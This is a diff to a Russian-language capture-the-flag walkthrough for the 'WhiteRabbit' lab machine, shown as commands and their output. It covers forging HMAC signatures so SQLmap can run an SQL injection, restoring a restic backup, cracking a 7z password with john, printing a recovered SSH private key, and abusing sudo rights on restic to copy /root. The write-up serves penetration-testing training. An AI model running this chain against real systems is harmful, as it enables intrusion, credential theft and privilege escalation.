@@ -288,17 +288,17 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
       }
 ```
 
-поле `email` не экранируеться, соотвественно, скорей всего, там есть SQL инъекция, но есть одна небольшая проблема: `LIMIT 1`, это небольшая проблема, потому 
+Поле `email` не экранируеться, соответственно, скорей всего, там есть SQL инъекция, но есть одна небольшая проблема: `LIMIT 1`, это небольшая проблема, потому 
 что её можно обойти
 
 В SQL `LIMIT` управляет количеством строк, которые вернёт запрос, в данном случае у нас SQL может вернуть только одну строку, поэтому класические вредоносные
 payload тут не будут работать. Место того, чтоб пытаться подбирать самостоятельно эти запросы, лучше будет использовать `SQLmap`, для этого, нам нужно написать 
-скрипт, который подделывать `HMAC` подпись: мы перехвачиваем запрос от `SQLmap`, хешируем его `body` с помощью нашего секрета, в `head` передаем этот хеш, и потом 
-уже отправляем запрос
+скрипт, который подделывать `HMAC` подпись: мы перехвачиваем запрос от `SQLmap`, хешируем его `body` с помощью нашего секрета, в `head` передаем этот хеш в параметр 
+x-gophish-signature, и потом уже отправляем запрос
 
 <img width="1280" height="520" alt="image" src="https://github.com/user-attachments/assets/cabdf99d-9ffc-4c61-842b-c95395110bd6" />
 
-Рекомендую лучше разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом
+Рекомендую разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом
 
 ```py
 from mitmproxy import http
@@ -390,24 +390,170 @@ Table: command_log
 
 + новый поддомен: `http://75951e6ff.whiterabbit.htb`
 
+[restic](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#local)
+
 ```
+Hexada@hexada ~/Downloads$ restic -r rest:http://75951e6ff.whiterabbit.htb snapshots                                                                                                       
+enter password for repository: 
+repository 5b26a938 opened (version 2, compression level auto)
+ID        Time                 Host         Tags        Paths
+------------------------------------------------------------------------
+272cacd5  2025-03-07 02:18:40  whiterabbit              /dev/shm/bob/ssh
+------------------------------------------------------------------------
+1 snapshots
+
 echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
 
-Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb  --password-file .restic_passwd ls latest                                                                                 
+Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore 272cacd5 -t .                                                                      
 repository 5b26a938 opened (version 2, compression level auto)
 [0:00] 100.00%  5 / 5 index files loaded
-snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit filtered by []:
-/dev
-/dev/shm
-/dev/shm/bob
-/dev/shm/bob/ssh
-/dev/shm/bob/ssh/bob.7z
-
-Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore latest --target ./restore-dir                                                      
-repository 5b26a938 opened (version 2, compression level auto)
-[0:00] 100.00%  5 / 5 index files loaded
-restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./restore-dir
+restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to .
 Summary: Restored 5 files/dirs (572 B) in 0:00
+
+Hexada@hexada ~/dev/shm/bob/ssh$ ls                                                                                                                                                        
+bob.7z
 ```
+
+```
+Hexada@hexada ~/dev/shm/bob/ssh$ 7z x bob.7z                                                                                                                                          7 ↵  
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 572 bytes (1 KiB)
+
+Extracting archive: bob.7z
+--
+Path = bob.7z
+Type = 7z
+Physical Size = 572
+Headers Size = 204
+Method = LZMA2:12 7zAES
+Solid = +
+Blocks = 1
+
+    
+Enter password:ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
+
+ERROR: Data Error in encrypted file. Wrong password? : bob
+ERROR: Data Error in encrypted file. Wrong password? : bob.pub
+ERROR: Data Error in encrypted file. Wrong password? : config
+             
+Sub items Errors: 3
+
+Archives with Errors: 1
+
+Sub items Errors: 3
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ 7z2john dev/shm/bob/ssh/bob.7z > bob.hash
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ cat bob.hash                                                                                                                             
+bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ john --wordlist=/home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt bob.hash                   
+Warning: detected hash type "7z", but the string is also recognized as "7z-opencl"
+Use the "--format=7z-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
+Cost 1 (iteration count) is 524288 for all loaded hashes
+Cost 2 (padding size) is 3 for all loaded hashes
+Cost 3 (compression type) is 2 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1q2w3e4r5t6y     (bob.7z)
+1g 0:00:07:33 DONE (2025-08-21 18:44) 0.002204g/s 52.55p/s 52.55c/s 52.55C/s 230891..150388
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ 7z x bob.7z                                                                                                              
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 572 bytes (1 KiB)
+
+Extracting archive: bob.7z
+--
+Path = bob.7z
+Type = 7z
+Physical Size = 572
+Headers Size = 204
+Method = LZMA2:12 7zAES
+Solid = +
+Blocks = 1
+
+    
+Enter password:1q2w3e4r5t6y
+
+Everything is Ok
+
+Files: 3
+Size:       557
+Compressed: 572
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ ls                                                                                                                       
+bob  bob.7z  bob.pub  config
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ cat config                                                                                                               
+Host whiterabbit
+  HostName whiterabbit.htb
+  Port 2222
+  User bob
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ cat bob                                                                                                                  
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
+VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
+AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
+FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
+-----END OPENSSH PRIVATE KEY-----
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ ssh -i bob -p 2222 bob@whiterabbit.htb                                                                                   
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Aug 21 15:29:06 2025 from 10.10.14.42
+bob@ebdce80611e9:~$ 
+```
+
+```
+bob@ebdce80611e9:~$ sudo -l
+Matching Defaults entries for bob on ebdce80611e9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User bob may run the following commands on ebdce80611e9:
+    (ALL) NOPASSWD: /usr/bin/restic
+```
+
+```
+bob@ebdce80611e9:~$ mkdir repo
+
+bob@ebdce80611e9:~$ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
+
+bob@ebdce80611e9:~$ sudo restic init -r repo --password-file .restic_passwd
+
+bob@ebdce80611e9:~$ sudo restic backup /root -r repo --password-file .restic_passwd
+
+bob@ebdce80611e9:~$ ls repo
+config  data  index  keys  locks  snapshots
+```
+
 
 
